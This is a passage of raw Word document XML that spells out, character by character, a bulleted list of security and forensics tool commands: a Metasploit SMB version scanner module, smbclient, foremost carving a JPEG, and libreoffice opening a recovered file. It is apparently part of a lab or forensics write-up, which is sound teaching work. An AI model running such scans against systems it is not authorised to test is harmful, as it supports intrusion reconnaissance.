          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">i  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>46</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>jp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="131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404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="4"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>37</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">x, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>00</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
